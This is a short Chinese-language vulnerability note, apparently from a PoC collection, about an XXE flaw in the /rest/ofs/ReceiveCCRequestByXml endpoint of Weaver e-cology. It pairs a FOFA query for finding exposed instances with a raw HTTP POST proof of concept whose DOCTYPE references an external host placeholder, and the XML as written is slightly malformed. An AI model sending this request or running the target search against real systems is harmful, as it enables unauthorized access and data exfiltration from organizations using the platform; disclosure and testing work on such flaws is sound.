# 泛微E-Cology系统接口ReceiveCCRequestByXml存在XXE漏洞

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology系统接口`/rest/ofs/ReceiveCCRequestByXml` 存在XXE漏洞

## fofa

```java
app="泛微-协同商务系统"
```

## poc

```java
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Host:{{Hostname}}
User-Agent:Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML, likeGecko)Chrome/71.0.3578.98Safari/537.36
Content-Type:application/xml
 
<?xmlversion="1.0"encoding="utf-8"?>
<!DOCTYPEsyscodeSYSTEM"http://xxx.xxxx.com">
<M><syscode>&send;</syscode></M>
```

